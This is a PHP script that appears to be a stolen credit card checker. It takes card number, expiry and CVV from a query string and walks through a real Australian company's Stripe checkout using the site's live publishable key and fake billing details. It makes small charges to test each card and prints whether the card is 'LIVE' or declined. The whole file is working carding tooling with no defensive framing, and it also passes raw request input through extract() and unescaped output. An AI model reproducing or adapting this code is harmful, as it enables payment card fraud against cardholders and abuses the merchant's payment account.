<?php
    error_reporting(0);
    $time_start = microtime(true);

    function GetStr($string, $start, $end){
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }

    function RandomString($length = 7)
    {
        $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString     = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    extract($_GET);
    $separator = explode("|", $lista);
    $cc = $separator[0];
    $mm = $separator[1];
    $yy = $separator[2];
    $y = substr($yy, 2,4);
    $cvv = $separator[3];
    $postcode = mt_rand(10080, 94545);
    $str = RandomString();
    $username = RandomString().mt_rand(1, 999);

    $cbin = substr($cc, 0,1);
    if($cbin == 5) {
        $cbin = 'master-card';
    } else if($cbin == 4) {
        $cbin = 'visa';
    } else if($cbin == 3) {
        $cbin = 'amex';
    } else {
        $cbin = 'null';
    }

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://itbasecamp.com.au/payments',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$username.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$username.txt",
        CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
        CURLOPT_HEADER => 0,
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
    ));
    $getVariables = curl_exec($ch);
    $csrf_token = GetStr($getVariables, 'name="CRAFT_CSRF_TOKEN" value="', '"');
    $paymentResult = GetStr(GetStr($getVariables, '<input type="hidden" aria-hidden="true" name="redirect"', '<input'), 'value="', '"');


    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://itbasecamp.com.au/enupal/stripe/create-checkout-session',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$username.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$username.txt",
        CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
        CURLOPT_HEADER => 1,
        CURLOPT_HTTPHEADER => array(
            'accept: application/json, text/javascript, */*; q=0.01',
            'content-type: application/x-www-form-urlencoded; charset=UTF-8',
            'origin: https://itbasecamp.com.au',
            'referer: https://itbasecamp.com.au/payments',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "CRAFT_CSRF_TOKEN=$csrf_token&action=enupal-stripe%2Fstripe%2Fsave-order&redirect=$paymentResult&enableCheckout=1&enupalStripe%5Btoken%5D=&enupalStripe%5Bemail%5D=&enupalStripe%5BformId%5D=564&enupalStripe%5Bamount%5D=50&enupalStripe%5Bquantity%5D=1&enupalStripe%5BtaxAmount%5D=&enupalStripe%5BamountBeforeTax%5D=&enupalStripe%5BstripeData%5D=&enupalStripe%5BtestMode%5D=0&enupalStripe%5Bmetadata%5D%5BInvoiceNo%5D=AT12345&enupalStripe%5Bmetadata%5D%5BDescription%5D=AT12345&enupalStripe%5Bmetadata%5D%5BName%5D=AT12345&enupalStripe%5BcustomAmount%5D=0.5&couponCode=&enupalCouponCode=&enupalStripe%5BenupalLineItems%5D=&enupalStripe%5BenupalAllowPromotionCodes%5D=&enupalStripe%5BenupalRemoveDefaultItem%5D=&action=enupal-stripe%2Fcheckout%2Fcreate-session&enupalStripeData=%7B%22useSca%22%3A%221%22%2C%22checkoutSuccessUrl%22%3A%22%22%2C%22checkoutCancelUrl%22%3A%22%22%2C%22paymentFormId%22%3A564%2C%22handle%22%3A%22paymentForm2%22%2C%22amountType%22%3A%221%22%2C%22customerQuantity%22%3Afalse%2C%22buttonText%22%3A%22%22%2C%22paymentButtonProcessingText%22%3A%22Pay+with+card%22%2C%22pbk%22%3A%22pk_live_GXdE1zUnlOKHhzg8bBzgOxC1%22%2C%22testMode%22%3A0%2C%22enableRecurringPayment%22%3Afalse%2C%22recurringPaymentType%22%3A%22year%22%2C%22customAmountLabel%22%3A%22Invoice+Total%22%2C%22enableSubscriptions%22%3Anull%2C%22subscriptionType%22%3A%220%22%2C%22subscriptionStyle%22%3A%22radio%22%2C%22singleSetupFee%22%3Anull%2C%22enableCustomPlanAmount%22%3Anull%2C%22multiplePlansAmounts%22%3A%5B%5D%2C%22setupFees%22%3A%5B%5D%2C%22applyTax%22%3Afalse%2C%22enableTaxes%22%3A0%2C%22tax%22%3Anull%2C%22currencySymbol%22%3A%22A%24%22%2C%22taxLabel%22%3A%22Tax+Amount%22%2C%22paymentTypeIds%22%3Anull%2C%22enableShippingAddress%22%3Anull%2C%22enableBillingAddress%22%3Anull%2C%22coupon%22%3A%7B%22enabled%22%3Afalse%2C%22displayTotal%22%3Afalse%2C%22totalAmountLabel%22%3Afalse%2C%22label%22%3A%22Coupon+Code%22%2C%22successMessage%22%3A%22%7Bname%7D+-+%7Bid%7D%22%2C%22errorMessage%22%3A%22This+coupon+is+not+valid%22%7D%2C%22quantity%22%3A1%2C%22stripe%22%3A%7B%22description%22%3A%22Invoice+Payment+Form%22%2C%22panelLabel%22%3A%22%22%2C%22name%22%3A%22IT+Basecamp+%22%2C%22currency%22%3A%22AUD%22%2C%22locale%22%3A%22en%22%2C%22amount%22%3A%2250%22%2C%22image%22%3A%22https%3A%2F%2Fitbasecamp.com.au%2Fimages%2Fstripe-logo.png%22%2C%22email%22%3A%22%22%2C%22allowRememberMe%22%3Afalse%2C%22zipCode%22%3Afalse%7D%7D"
    ));
    $createSession = curl_exec($ch);
    $sessionId = GetStr($createSession, '"sessionId":"', '"');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://api.stripe.com/v1/payment_pages/'.$sessionId.'?key=pk_live_GXdE1zUnlOKHhzg8bBzgOxC1',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$username.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$username.txt",
        CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
        CURLOPT_HEADER => 1,
        CURLOPT_HTTPHEADER => array(
            'accept: application/json',
            'origin: https://checkout.stripe.com',
            'referer: https://checkout.stripe.com/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'
        ),
    ));
    $getPPage = curl_exec($ch);
    $ppage = GetStr($getPPage, '"id": "','"');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$username.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$username.txt",
        CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
        CURLOPT_HEADER => 1,
        CURLOPT_HTTPHEADER => array(
            'accept: application/json',
            'content-type: application/x-www-form-urlencoded',
            'origin: https://checkout.stripe.com',
            'referer: https://checkout.stripe.com/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "type=card&card[number]=$cc&card[cvc]=$cvv&card[exp_month]=$mm&card[exp_year]=$y&billing_details[name]=ragnarsson&billing_details[email]=$username@gmail.com&billing_details[address][country]=PH&guid=ac2220b8-0a9e-421b-98d5-2ff43712921aea9796&muid=cf4e2e3f-dbde-46de-ac10-17d1dd2065cfd3c3a7&sid=624b3295-133c-4d7a-8643-51752a55942c115cc5&key=pk_live_GXdE1zUnlOKHhzg8bBzgOxC1&payment_user_agent=stripe.js%2Fe7755c8d%3B+stripe-js-v3%2Fe7755c8d%3B+checkout"
    ));
    $checkout = curl_exec($ch);
    $pm = GetStr($checkout, '"id": "', '"');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://api.stripe.com/v1/payment_pages/'.$ppage.'/confirm',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$username.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$username.txt",
        CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
        CURLOPT_HEADER => 1,
        CURLOPT_HTTPHEADER => array(
            'accept: application/json',
            'content-type: application/x-www-form-urlencoded',
            'origin: https://checkout.stripe.com',
            'referer: https://checkout.stripe.com/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "eid=NA&payment_method=$pm&expected_amount=50&key=pk_live_GXdE1zUnlOKHhzg8bBzgOxC1",
    ));
    $execute = curl_exec($ch);
    curl_close($ch);

    $dcode = GetStr($execute, '"decline_code": "', '"');
    $message = GetStr($execute, '"message": "', '"');
    $confirmation = GetStr($execute, '"state": "', '"');

    if(strpos($execute, 'succeeded')) {
        echo '<tr><td><span class="badge badge-success badge-pill">LIVE</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td> <td><span class="badge badge-success badge-pill">Response: '.$confirmation.'</span></td></tr><br>';
    }
    else {
        echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">'.$dcode.' '.$message.'</span></td></tr><br>';
    }
    unlink("$username.txt");
?>
